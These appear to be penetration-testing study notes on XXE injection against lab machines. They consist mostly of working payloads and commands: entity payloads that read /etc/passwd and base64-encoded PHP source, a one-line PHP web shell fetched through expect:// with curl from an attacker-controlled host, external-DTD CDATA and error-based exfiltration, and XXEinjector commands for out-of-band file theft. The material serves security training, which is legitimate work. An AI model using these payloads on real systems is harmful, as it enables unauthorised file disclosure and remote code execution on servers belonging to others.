### Reading Sensitive files

Form submitted:

```bash
POST /submitDetails.php HTTP/1.1
Host: 10.129.182.100
Content-Length: 157
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.182.100
Referer: http://10.129.182.100/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<root>
<name>test</name>
<tel>012334567890</tel>
<email>a_lindon@employees.htb</email>
<message>test</message>
</root>
```

We can update the POST request to the following to read the `/etc/passwd` file:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
<name>test</name>
<tel>012334567890</tel>
<email>&company;</email>
<message>test</message>
</root>
```

### Reading Source Code

Similarly, XXE can be used to read the source code of other files:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
<name>test</name>
<tel>012334567890</tel>
<email>&company;</email>
<message>test</message>
</root>
```

This gives the output in base64 which can easily be decoded:

![[Pasted image 20250130190718.png]]
### Remote Code Execution with XXE

RCE may also be possible:

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

And sent the following payload:

```bash
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'10.10.14.32/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work

### Exfiltration with CDATA

Not all XXE vulnerabilities may be straightforward to exploit, as we have seen in the previous section. Some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values in some instances, so we may try to force it through errors.
#### CDATA

Local Host:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Payload - Update file location and IP address:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
 <!ENTITY % file SYSTEM "file:///etc/hosts">
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://10.10.14.32:8000/xxe.dtd">
  %xxe;
]>
<root>
<name>test</name>
<tel></tel>
<email>&joined;</email>
<message>
</message>
</root>
```

### Error Based XXE

Local Host:

```bash
cat xxe2.dtd 
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Send request:

```bash
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.32:8000/xxe2.dtd">
  %remote;
  %error;
]>
```

### Automated Out-of-band Data Exfiltration

Grab the request from Burp and save as a file. Add:

```bash
<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

To the bottom of the request:

```bash
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.249.248
Content-Length: 173
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.249.248
Referer: http://10.129.249.248/blind/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Install XXEinjector:

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Usage Example:

```bash
ruby XXEinjector.rb --host=[Your IP] --httpport=8000 --file=<burpfile> --path=/etc/passwd --oob=http --phpfilter
```

Usage:

```bash
sudo ruby XXEinjector.rb --host=10.10.14.32 --httpport --file=test.txt --path=/etc/passwd --oob=http --phpfilter
```

Look in the Logs directory to see output:

```bash
cat Logs/10.129.249.248/etc/passwd.log
```